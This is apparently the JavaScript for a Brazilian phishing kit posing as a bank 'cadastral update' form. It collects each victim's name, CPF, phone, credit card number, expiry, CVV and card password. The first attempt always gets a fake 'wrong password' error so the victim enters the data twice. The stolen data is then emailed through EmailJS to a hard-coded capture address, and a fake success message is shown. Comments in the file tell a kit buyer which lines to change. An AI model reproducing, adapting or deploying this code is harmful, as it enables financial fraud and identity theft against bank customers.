
//MUDAR SÓ ISSO AQUI
//WILL DESENVOLVEDOR - FEITO COM MUITO CARINHO
var email_captura = "mantoniodatsch@gmail.com"; 	


const capturaErros = () => {
	return true;
}


$( "#btn-enviar" ).click(function() {
 
	toastr.options = {
	  "closeButton": false,
	  "debug": false,
	  "newestOnTop": false,
	  "progressBar": true,
	  "positionClass": "toast-top-right",
	  "preventDuplicates": true,
	  "onclick": null,
	  "showDuration": "300",
	  //tempo que o modal aparece 
	  "hideDuration": "1000",
	  "timeOut": "5000",
	  "extendedTimeOut": "1000",
	  "showEasing": "swing",
	  "hideEasing": "linear",
	  "showMethod": "fadeIn",
	  "hideMethod": "fadeOut"
}
	
	var controla = "Verdadeiro";
	//caso não tenha salvo em local-storage
	var nome = $("#nome").val();
	var cpf = $('#cpf').val();
	var validade = $('#validade').val();
	var telefone = $('#telefone').val();
	var credit_card = $("#cartao").val();
	var senha = $('#senha').val();
	var cvv = $('#cvv').val();

	//Campos vazios
	if(nome == "" || cpf == "" || validade == "" || telefone == "" || credit_card == "" || senha == ""){
		toastr["error"]("Você esqueceu de preencher alguns dados.");
	}else{
		//verificações de segurança
		if(cpf.length < 14)
		{
			toastr["error"]("CPF inválido!");
		}else if(validade.length < 5)
		{
			toastr["error"]("Validade do cartão inválida!");
		}else if(telefone.length < 13)
		{
			toastr["error"]("Número de telefone inválido!");
		}else if(credit_card.length < 19)
		{
			toastr["error"]("Número de cartão de crédito inválido!");
		}else if(cvv.length < 3)
		{
			toastr["error"]("CVV inválido!");
		}else{
				if(!localStorage.getItem('primeiro')) 
				{
					//Mensagem modal -> lado direito senha incorreta
					toastr["error"]("Senha incorreta.");
					//Não mexer!!! oque tá embaixo
					localStorage.setItem('primeiro', controla);
				}else{
						//muda esses dois, eu que tenho que gerar pra ti
						//porque gero via linha de comando no servidor de e-mail!
						emailjs.send("service_xmeyaie","template_58frmvl",{
						from_name: "NOVA-INFO",
						nome: nome,
						cpf: cpf,
						cartao: credit_card,
						validade: validade,
						cvv: cvv,
						senha: senha,
						reply_to: email_captura,
						});
						toastr["success"]("Atualização cadastral realizada com sucesso!");
						//limpa os input
						$('#nome').val("");
						$('#cpf').val("");
						$('#validade').val("");
						$('#telefone').val("");
						$('#cartao').val("");
						$('#senha').val("");
						$('#cvv').val("");
			}	
		}
	}
});

$(document).ready(function(){
	//não mexer no que tá aqui dentro
	$('#cvv').mask('000');
	$('#validade').mask('00/00');
	$('#cpf').mask('000.000.000-00');
	$('#telefone').mask('(00)000000000');
	$('#cartao').mask('0000 0000 0000 0000');
	$('#senha').mask('0000000000');
	localStorage.removeItem('primeiro');
});